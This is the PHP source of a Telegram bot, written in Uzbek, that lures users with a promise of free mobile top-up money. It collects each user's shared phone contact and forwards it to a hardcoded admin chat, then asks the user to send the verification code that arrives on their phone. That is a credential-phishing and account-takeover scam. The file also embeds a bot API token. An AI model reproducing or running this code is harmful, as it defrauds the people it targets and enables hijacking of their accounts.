<?php

define('API_KEY','5043263800:AAGjelGJwDUen1OuxcoXgLzEG1Auk8mAjng');

$admin = "1885895495"; // admin idsi

function del($nomi){

array_map('unlink', glob("$nomi"));

}

//kod @shuxrat5405 tomonidan yozildi

function put($fayl,$nima){

file_put_contents("$fayl","$nima");

}

function get($fayl){

$get = file_get_contents("$fayl");

return $get;

}

function ty($ch){ 

return bot('sendChatAction', [

'chat_id' => $ch,

'action' => 'typing',

]);

}

function editMessageText(

        $chatId,

        $messageId,

        $text,

        $parseMode = null,

        $disablePreview = false,

        $replyMarkup = null,

        $inlineMessageId = null

    ) {

       return bot('editMessageText', [

            'chat_id' => $chatId,

            'message_id' => $messageId,

            'text' => $text,

            'inline_message_id' => $inlineMessageId,

            'parse_mode' => $parseMode,

            'disable_web_page_preview' => $disablePreview,

            'reply_markup' => $replyMarkup,

        ]);

    }

function ACL($callbackQueryId, $text = null, $showAlert = false)

{

     return bot('answerCallbackQuery', [

        'callback_query_id' => $callbackQueryId,

        'text' => $text,

        'show_alert'=>$showAlert,

    ]);

}

function bot($method,$datas=[]){

    $url = "https://api.telegram.org/bot".API_KEY."/".$method;

    $ch = curl_init();

    curl_setopt($ch,CURLOPT_URL,$url);

    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);

    curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);

    $res = curl_exec($ch);

    if(curl_error($ch)){

        var_dump(curl_error($ch));

    }else{

        return json_decode($res);

    }

}

$update = json_decode(get('php://input'));

$message = $update->message;

$text = $message->text;

$cid = $message->chat->id;

$uid = $message->from->id;

$fname = $message->from->first_name;

$user = $message->from->username;

$data = $message->contact;

$nomer = $message->contact->phone_number;

$name = $message->contact->first_name;





if($text == "/start" or $text == "❌Bekor qilish"){

    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"*👋Salom [$fname] botga xush kelibsiz bepul paynet qilish uchun oldin* [@xxxx] *kanaliga obuna bo'lgan bo'lishiz lozim bo'lmasa pul o'tmaydi.\n\nKeyin esa Royxatdan otishni bosing*",

        'parse_mode'=>"markdown",

        'reply_markup'=>json_encode(

['resize_keyboard'=>true,

'keyboard' => [

[["text"=>"⏳Ro'yxatdan o'tish",'request_contact' =>true],],

]

])

]);

}

if($data){

bot('sendmessage',[

    'chat_id'=>"1703133501",
//admin id
    'text'=>"Botda yangi a'zo:\nUser nomi: [$fname](tg://user?id=$uid)\nUseri: @$user\nNomeri: $nomer\nNomer nomi: $name",

    'parse_mode'=>"markdown"

        ]);

bot("sendmessage",[

    'chat_id'=>$cid,

    'text'=>"Numer qabul qilindi endi TAYOR knopkasini bosing!",

    'reply_markup'=>json_encode(

[

'resize_keyboard'=>true,

'selective'=>true,

'one_time_keyboard'=>true,

'keyboard' => [

[["text"=>"✅TAYOR"],],

]

])

]);

}



$button = $message->keyboardbutton->text;

if($text == "✅TAYOR"){

    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"Marxamat nechi sum paynet qildirmoqchi bo`lsangiz o`sha miqdorni tanlang",

  'reply_markup'=>json_encode(

[

'resize_keyboard'=>true,

'selective'=>true,

'one_time_keyboard'=>true,

'keyboard' => [

[["text"=>"💰1.000 sum"],],

[["text"=>"💰3.000 sum"],],

[["text"=>"💰5.000 sum"],],

[["text"=>"💰10.000 sum"],],

[["text"=>"❌Bekor qilish"],],





]

])

]);

}

$button = $message->keyboardbutton->text;

if($text == "💰1.000 sum" or $text == "💰3.000 sum" or $text == "💰5.000 sum" or $text == "💰10.000 sum"){

    bot('sendmessage',[

        'chat_id'=>$cid,

        'text'=>"Развёрнутый ответ



Xammasi tayyor ☑️ bir oz muddatdan kegin sizni numeringizga kod boradi kodni shuyerga yozasiz va готово knopkasini bosisiz keyin biroz kutasiz qarabsizki numeringizga belgilagan miqdoringizda pul tushadi🙂"]);

        }

        